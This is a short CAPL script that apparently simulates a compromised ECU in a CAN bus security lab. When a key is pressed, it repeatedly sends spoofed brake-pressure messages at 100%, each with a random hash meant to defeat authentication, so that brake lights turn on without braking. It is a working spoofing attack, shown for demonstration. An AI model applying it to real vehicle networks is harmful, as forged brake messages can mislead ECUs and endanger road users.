/*@!Encoding:1252*/
/**
 * This ECU is a simulated, compromised ECU.
 * It's goal is to trigger undesired behaviour in other ECUs connected to the same CAN bus.
 * This particular ECU sends out messages pretending to report an applied brake pressure of 100%.
 * The goal of that is to turn on the brake lights without pressing the physical brakes.
**/

variables
{
  message LightState msg_LightState; // declaration of message into a variable
  message BrakeState msg_BrakeState; // declaration of message into a variable
  mstimer t;
  int tdelay=1;
}

on start
{
   write("Hello World, I am a compromised ECU.");
}

/**
 * Pressing the 'h' key starts the timer to send out malicious messages.
**/
on key 'h'
{
  write("Sending manipulated CAN messages.");
  settimer(t,tdelay);
}

/**
 * Pressing the 'c' key stops the timer to send out malicious messages.
**/
on key 'c'
{
  write("Stopped manipulated CAN messages.");
  cancelTimer(t);
  msg_BrakeState.BrakePressure = 0;
  output(msg_BrakeState);
}

/**
 * This function sends out a message to the CAN bus pretending to have a physical brake pressure of 100%.
 * It also sends a random 3 byte hash, in an attempt to fool the hash authentication.
**/
on timer t{
  msg_BrakeState.BrakePressure = 100;
  msg_BrakeState.Hash = random(16777216);
  output(msg_BrakeState);
  settimer(t,tdelay);
}